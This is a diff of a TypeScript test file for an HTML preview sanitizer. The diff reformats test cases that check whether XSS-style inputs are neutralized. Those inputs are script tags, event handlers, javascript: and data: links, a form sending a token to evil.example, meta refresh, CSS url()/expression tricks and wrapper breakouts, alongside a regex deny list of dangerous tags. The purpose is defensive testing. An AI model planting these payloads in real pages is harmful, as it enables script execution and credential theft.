@@ -22,7 +22,9 @@ function expectInert(document: string) {
   expect(lower).not.toMatch(/\son[a-z]+\s*=/);
   expect(lower).not.toContain('javascript:');
   expect(lower).not.toContain('vbscript:');
-  expect(lower).not.toMatch(/<(iframe|frame|object|embed|form|input|button|select|textarea|svg|math|base|link|template|noscript)\b/);
+  expect(lower).not.toMatch(
+    /<(iframe|frame|object|embed|form|input|button|select|textarea|svg|math|base|link|template|noscript)\b/
+  );
   expect(lower).not.toMatch(/https?:\/\//);
   expect(lower).not.toContain('expression(');
   expect(lower).not.toContain('@import');
@@ -53,18 +55,54 @@ describe('artifact HTML preview document', () => {
 
   test.each([
     ['script tags', '<script>parent.steal()</script><p>Kept</p>'],
-    ['event handlers', '<p onclick="steal()" ONLOAD=steal() onmouseover = steal()>Kept</p><body onload="x()">'],
-    ['javascript: links', '<a href="javascript:steal()">Kept</a><a href=" JaVaScRiPt:steal()">Kept</a>'],
-    ['data: documents', '<a href="data:text/html,<script>x()</script>">Kept</a><img src="data:text/html;base64,PHNjcmlwdD4=">'],
-    ['remote assets', '<img src="https://evil.example/p.png"><link rel="stylesheet" href="http://evil.example/a.css"><video src="https://evil.example/v.mp4"></video><p style="background:url(https://evil.example/x.png)">Kept</p>'],
-    ['forms', '<form action="https://evil.example"><input name="token"><button>Send</button><textarea>a</textarea></form><p>Kept</p>'],
-    ['frames and objects', '<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x"><frameset><frame src="y"></frameset><p>Kept</p>'],
-    ['meta refresh and authored CSP', '<meta http-equiv="refresh" content="0;url=https://evil.example"><meta http-equiv="Content-Security-Policy" content="script-src *"><base href="https://evil.example/"><p>Kept</p>'],
-    ['CSS url, import and expression', '<style>@import url("https://evil.example/a.css");p{background:url(//evil.example/x);width:expression(alert(1))}</style><p style="width:expression(alert(1));background-image:url(\'http://evil.example/y\')">Kept</p>'],
-    ['CSS escapes hiding url()', '<style>p{background:u\\72l(//evil.example/x)}</style><p style="background:u\\rl(//evil.example)">Kept</p>'],
-    ['SVG and MathML scripts', '<svg onload="x()"><script>x()</script><a xlink:href="javascript:x()"><text>t</text></a></svg><math><mtext><a href="javascript:x()">m</a></mtext></math><p>Kept</p>'],
-    ['wrapper breakout', '</title></style></head><body></html><meta http-equiv="refresh" content="0"><script>x()</script><!-- --><!--<script>x()</script>--><plaintext><script>x()</script><p>Kept</p>'],
-    ['template and noscript', '<template><script>x()</script></template><noscript><img src="https://evil.example"></noscript><p>Kept</p>'],
+    [
+      'event handlers',
+      '<p onclick="steal()" ONLOAD=steal() onmouseover = steal()>Kept</p><body onload="x()">',
+    ],
+    [
+      'javascript: links',
+      '<a href="javascript:steal()">Kept</a><a href=" JaVaScRiPt:steal()">Kept</a>',
+    ],
+    [
+      'data: documents',
+      '<a href="data:text/html,<script>x()</script>">Kept</a><img src="data:text/html;base64,PHNjcmlwdD4=">',
+    ],
+    [
+      'remote assets',
+      '<img src="https://evil.example/p.png"><link rel="stylesheet" href="http://evil.example/a.css"><video src="https://evil.example/v.mp4"></video><p style="background:url(https://evil.example/x.png)">Kept</p>',
+    ],
+    [
+      'forms',
+      '<form action="https://evil.example"><input name="token"><button>Send</button><textarea>a</textarea></form><p>Kept</p>',
+    ],
+    [
+      'frames and objects',
+      '<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x"><frameset><frame src="y"></frameset><p>Kept</p>',
+    ],
+    [
+      'meta refresh and authored CSP',
+      '<meta http-equiv="refresh" content="0;url=https://evil.example"><meta http-equiv="Content-Security-Policy" content="script-src *"><base href="https://evil.example/"><p>Kept</p>',
+    ],
+    [
+      'CSS url, import and expression',
+      '<style>@import url("https://evil.example/a.css");p{background:url(//evil.example/x);width:expression(alert(1))}</style><p style="width:expression(alert(1));background-image:url(\'http://evil.example/y\')">Kept</p>',
+    ],
+    [
+      'CSS escapes hiding url()',
+      '<style>p{background:u\\72l(//evil.example/x)}</style><p style="background:u\\rl(//evil.example)">Kept</p>',
+    ],
+    [
+      'SVG and MathML scripts',
+      '<svg onload="x()"><script>x()</script><a xlink:href="javascript:x()"><text>t</text></a></svg><math><mtext><a href="javascript:x()">m</a></mtext></math><p>Kept</p>',
+    ],
+    [
+      'wrapper breakout',
+      '</title></style></head><body></html><meta http-equiv="refresh" content="0"><script>x()</script><!-- --><!--<script>x()</script>--><plaintext><script>x()</script><p>Kept</p>',
+    ],
+    [
+      'template and noscript',
+      '<template><script>x()</script></template><noscript><img src="https://evil.example"></noscript><p>Kept</p>',
+    ],
   ])('neutralizes %s', (_name, html) => {
     const prepared = prepareArtifactHtml(html);
     expectInert(prepared.document);
